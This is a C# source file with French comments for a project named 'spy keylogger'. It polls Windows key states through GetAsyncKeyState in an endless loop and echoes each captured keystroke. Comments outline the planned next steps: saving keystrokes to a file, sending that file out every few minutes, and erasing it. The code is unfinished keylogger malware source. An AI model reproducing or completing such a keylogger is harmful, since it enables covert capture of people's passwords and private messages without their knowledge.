using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace ProjetEspionKeyLogger
{
    class Enregistrement
    {
        //Contenu de l'enregistrement courrant
        private String contenu;

        //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
        //Cette fonction vient d'une librairie stockée dans user32.dll (le keylogger ne marche donc que sur windows, pas mac)
        // l'argument est une "virtual key code " car chaque action est asscoiée à une clé


        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int cle);

        public static void Capture()
        {
            //capture les frappes de touches et les afficher dans la console
            while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
            {
                //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
                Thread.Sleep(100); //nombre en miliseconde

                //verification de l'état de chaque touche (up ou down)
                //avec une table des code ASCII, les codes de clavier vont de 0 à 127
                //on va vérifier ces 128 touches
                for (int codeASCII = 0; codeASCII < 128; codeASCII++)
                {
                    int statut_cle = GetAsyncKeyState(codeASCII);
                    //le statut d'un clé est a 0 si elle n'est pas active
                    //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
                    // on caste le nombre ascii en char
                    if (statut_cle == 32769)
                    {
                        Console.Write((char)codeASCII);

                        //probleme : tout en majuscule + certaines touches non detectées
                        //je pense que c'est obligé d'être réglé dans la partie interface

                        //ecriture dans un fichier texte
                        // KeyLogger.enregistreTxt((char)codeASCII);

                        //toutes les x minutes envoyer le fichier

                        //effacer le fichier le contenu pour avoir le nouveau contenu


                    }
                }
            }
        }


        //Renvoit la date et l'heure courrante
        public String dateTimeNow()
        {
            //Date actuelle
            DateTime thisDay = DateTime.Now;

            //retourne la date sous forme de chaine
            return thisDay.ToString();
        }


    }
}
